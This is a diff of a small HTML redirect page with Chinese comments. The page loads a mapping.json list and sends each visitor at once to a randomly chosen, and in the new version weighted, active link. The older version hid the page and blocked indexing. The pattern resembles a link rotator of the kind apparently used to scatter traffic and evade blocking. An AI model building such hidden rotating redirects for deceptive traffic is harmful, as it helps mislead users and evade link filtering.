@@ -1,52 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh">
 <head>
   <meta charset="UTF-8">
+  <title>Loading...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noindex,nofollow">
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: #fff;
-      overflow: hidden;
-      display: none;
-    }
-  </style>
-
   <script>
-    (async () => {
-      const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
-
+    async function redirect() {
       try {
-        // 强制拉最新 JSON
-        const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
-        if (!res.ok) throw new Error("mapping.json not found");
-
+        const res = await fetch("mapping.json?ts=" + Date.now()); // 加随机参数避免缓存
         const data = await res.json();
-        if (!data || !Array.isArray(data.links)) throw new Error("Invalid mapping structure");
-
-        // 只使用最新数据，不使用缓存
         const activeLinks = data.links.filter(l => l.active);
-        if (!activeLinks.length) throw new Error("No active links");
 
-        const idx = Math.floor(Math.random() * activeLinks.length);
-        location.replace(activeLinks[idx].url);
-        return;
+        if (activeLinks.length === 0) {
+          return; // 没有可用链接则停留
+        }
 
+        // 按权重抽签
+        const weighted = [];
+        activeLinks.forEach(l => {
+          for (let i = 0; i < (l.weight || 1); i++) {
+            weighted.push(l.url);
+          }
+        });
+        const targetUrl = weighted[Math.floor(Math.random() * weighted.length)];
+
+        // 立即跳转
+        window.location.replace(targetUrl);
       } catch (e) {
-        console.error("Redirect failed:", e);
+        console.error("跳转失败", e);
       }
+    }
 
-      // 失败时不使用缓存，直接显示空页
-      document.body.style.display = "block";
-      document.body.innerHTML = `
-        <h2 style="font-family: sans-serif; padding: 20px;">
-          Please try again later.
-        </h2>
-      `;
-    })();
+    redirect();
   </script>
 </head>
-<body></body>
+<body>
+</body>
 </html>
